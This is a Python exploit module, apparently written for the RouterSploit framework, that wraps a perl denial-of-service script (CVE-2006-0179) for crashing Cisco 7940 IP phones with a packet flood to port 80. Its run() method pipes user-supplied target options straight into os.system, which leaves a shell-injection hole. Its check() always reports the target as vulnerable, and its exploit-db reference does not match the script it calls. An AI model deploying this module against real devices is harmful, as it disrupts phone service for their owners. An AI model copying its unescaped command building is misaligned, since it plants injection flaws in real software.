
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2006-0179",

        "description": "This is made for trashing cisco 7940 ip phones. kokanin made/discovered this. "
                       "A packetcount of 1000 and a packetdelay of 0.002 sent to port 80 makes my  "
                       "phone reboot - play with the settings and stuff., ",

        "authors": (

            "Janis Vizulis",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/1338",

        ),

        "devices": (

            "cisco, CVE-2006-0179"
        ),
    }


    target = OptIP("", "Victim destination IP")
    port = OptPort(""," TCP port  ")
    source = OptIP("","Victim source IP")
    num = OptString("","number of pkts")
    delay = OptString("","packet delay")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {} {} {} {}'.format('exploit-db-1411.pl',self.source,self.target,self.port,self.num,self.delay)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True